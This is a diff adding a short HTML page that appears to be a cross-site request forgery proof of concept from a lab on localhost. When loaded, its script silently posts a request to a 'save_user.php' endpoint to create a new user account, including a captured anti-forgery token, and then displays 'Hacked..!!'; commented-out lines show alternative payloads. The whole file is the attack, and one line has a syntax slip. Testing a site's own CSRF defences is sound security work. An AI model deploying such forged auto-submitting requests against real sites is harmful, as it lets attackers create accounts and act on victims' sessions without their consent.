@@ -1,0 +1,24 @@
+<html>
+	<head>
+		<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+		
+		<script>
+		/*var dat="uname=hacktest1&pwd=hacktest1&submit=ADD";*/
+		var dat="uname=nayantha&pwd=nayantha&_token=g3MlzkZegWcX9yu%2F8HG1G339mNwxYACBBkzhiGY5xbg%3D&submit=ADD":
+		/*var dat="uname=hacktest&pwd=ddd&submit=Add+New+User";*/
+		
+		$.ajax({
+			url:'http://localhost/csrf_protection/save_user.php',
+			method:'post',
+			data:dat,
+		})
+		</script>
+		
+	</head>
+	
+	<body>
+	
+<h1>Hacked..!!</h1>	
+	
+	</body>
+</html>
